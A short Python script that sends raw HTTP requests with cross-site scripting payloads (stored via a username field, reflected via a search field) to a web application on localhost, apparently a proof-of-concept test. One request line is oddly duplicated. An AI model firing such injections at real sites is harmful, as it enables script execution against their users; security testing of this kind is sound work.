import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",1920))

payload = 'GET /index.php?action=storenew&username=<script>alert()</script>index.php?action=storenew&username=<script>alert()</script> HTTP/1.1\r\n\r\n'
s.send(payload)

payload = 'GET /index.php?action=search&searchFor=\"><script>alert()</script > HTTP/1.1\r\n\r\n'
s.send(payload)
print s.recv(1024)